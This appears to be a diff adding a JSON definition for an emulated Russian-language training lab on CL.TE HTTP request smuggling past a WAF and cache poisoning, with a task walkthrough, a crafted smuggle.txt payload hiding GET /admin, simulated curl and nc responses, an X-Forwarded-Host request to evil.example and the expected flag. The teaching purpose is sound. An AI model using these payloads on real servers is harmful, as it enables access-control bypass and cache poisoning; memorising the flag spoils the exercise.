@@ -1,0 +1,31 @@
+{
+  "id": "web-waf-smuggling",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{cl_te_smuggl3_p4st_w4f_c4ch3_p01s0n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: WAF — request smuggling и cache poisoning\n\nСхема: клиент → WAF/прокси → бэкенд. WAF видит `GET /admin` и блокирует его.\nСпрячем второй запрос в теле первого (CL.TE): прокси считает по Content-Length,\nбэкенд — по Transfer-Encoding: chunked.\n\nЗаготовка smuggled-запроса — в файле `smuggle.txt`.\n\n1. WAF блокирует видимый /admin:\n\n   curl -s 'http://shop.local/admin'\n\n2. Прячем запрос в тело (CL.TE):\n\n   curl -s 'http://shop.local/' --data-binary @smuggle.txt -H 'Transfer-Encoding: chunked' > found.txt\n\n3. Подтверждение таймаутом (безопасный детект):\n\n   nc shop.local 80 < smuggle.txt\n\n4. Cache poisoning через незакэшированный заголовок:\n\n   curl -s -H 'X-Forwarded-Host: evil.example' 'http://shop.local/'\n\n5. Набери `check` (флаг пришёл из шага 2).\n" },
+    { "path": "/home/student/task/smuggle.txt", "text": "POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: shop.local\r\n\r\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local за WAF)",
+      "cases": [
+        { "match": "smuggle\\.txt|transfer-encoding", "example": "-s 'http://shop.local/' --data-binary @smuggle.txt -H 'Transfer-Encoding: chunked'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nadmin-note: nto{cl_te_smuggl3_p4st_w4f_c4ch3_p01s0n}\n" },
+        { "match": "X-Forwarded-Host|x-forwarded", "example": "-s -H 'X-Forwarded-Host: evil.example' 'http://shop.local/'", "output": "HTTP/1.1 200 OK\nCache-Control: public, max-age=60\nX-Cache: MISS\n\n<link rel=\"canonical\" href=\"https://evil.example/\">\n" },
+        { "match": "/admin", "example": "-s 'http://shop.local/admin'", "output": "HTTP/1.1 403 Forbidden\n\nWAF: blocked suspicious request (GET /admin)\n" },
+        { "match": "shop\\.local", "example": "-s 'http://shop.local/'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/ за WAF.\n"
+    },
+    "nc": {
+      "help": "nc <host> <port> [< файл] — сырой TCP-клиент (эмуляция)",
+      "cases": [
+        { "match": "smuggle\\.txt", "example": "shop.local 80 < smuggle.txt", "output": "real 0m10.0s  # бэкенд ждёт остаток chunked -> smuggling подтверждён\n" },
+        { "match": "shop\\.local 80", "example": "shop.local 80", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\n" }
+      ],
+      "fallback": "nc: в этой лабе эмулируется только shop.local:80.\n"
+    }
+  }
+}
